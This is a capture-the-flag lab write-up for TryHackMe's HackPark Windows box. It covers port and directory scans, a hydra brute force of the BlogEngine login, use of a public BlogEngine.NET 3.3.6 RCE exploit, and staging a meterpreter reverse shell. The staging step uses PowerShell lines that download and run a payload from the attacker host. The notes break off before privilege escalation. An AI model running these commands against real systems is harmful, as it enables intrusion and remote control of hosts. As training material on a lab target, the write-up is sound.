# THM - HackPark

#THM #HackPark #BlogEngine #Windows #hydra #meterpreter #winPEAS

Target: 10.10.54.169

## Kill chain

1. Full port scan + directory brute
2. Brute the ASP.NET login with `hydra` → `admin:1qaz2wsx`
3. BlogEngine.NET 3.3.6 → directory traversal / RCE (EDB 46353) → reverse shell
4. Stage a meterpreter payload, run winPEAS, review for privesc

## Recon

```bash
nmap -T4 -p- -n 10.10.54.169

gobuster dir -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.10.54.169
```

## Creds

ASP.NET WebForms login — the POST body must carry valid `__VIEWSTATE` and `__EVENTVALIDATION` tokens or every attempt is rejected before the password is even checked:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.54.169 http-post-form \
  "__VIEWSTATE=E%2ByTaVuTQY0JGp3LLCzpmCHJG2ahj4d2DjoI6S0C%2FUZfXykYmoK2I4nCa2GbZnrZUbzVgwhDMKliObxbG8FL0SR71BmHVavSKWplhxjD%2BqSWIGg3NSQ2RuXMjMg%2F2Y80JJ4q7EDdhy%2F88Cchb92GmysKvL0fv%2Bjv3iwjhWtfz5k1XTiP&__EVENTVALIDATION=DZXN7Vav25MAxzf17jzNZjthD5a3KJ9vGIYkrEsA5%2F%2FzWPWRb4R7LlCeDgEbx2eqfRX1gS61ixK5NpPN%2B0eCqLrhZ6ojwWYWC99ii78eZE8v8NeTjgkDMlzZj%2B1YjornoTJ4SpDLr6k7HWClagkWU30hMb3KpNkFp0Ocpp6BeMSMTl5O&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=asdrf&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in"
```

- `admin:1qaz2wsx`

## Foothold

**BlogEngine.NET 3.3.6 — directory traversal / RCE**, [EDB 46353](https://www.exploit-db.com/exploits/46353).

Copy the exploit code and follow the directions in its comment header — update the attacker IP and port (used 9001):

```bash
nc -lvnp 9001
```

## Privesc

Stage a 64-bit meterpreter payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=10.13.41.202 LPORT=9002 -f exe > shell-x64.exe
python3 -m http.server 8001
```

```powershell
cd c:\windows\temp
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.41.202:8001/shell-x64.exe','shell-x64.exe')"
powershell start-process "shell-x64.exe"
```

Handler — one-liner or interactive:

```bash
msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST 10.13.41.202;set LPORT 9002;run -j'
```

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.13.41.202
set LPORT 9002
run -j
sessions -i 1
```

Enumerate:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.41.202:8001/winpeasx64.exe','winpeasx64.exe')"
```

> [!warning] **The record stops here** — winPEAS was staged and the notes say "review", but no privesc finding and no flags were captured.
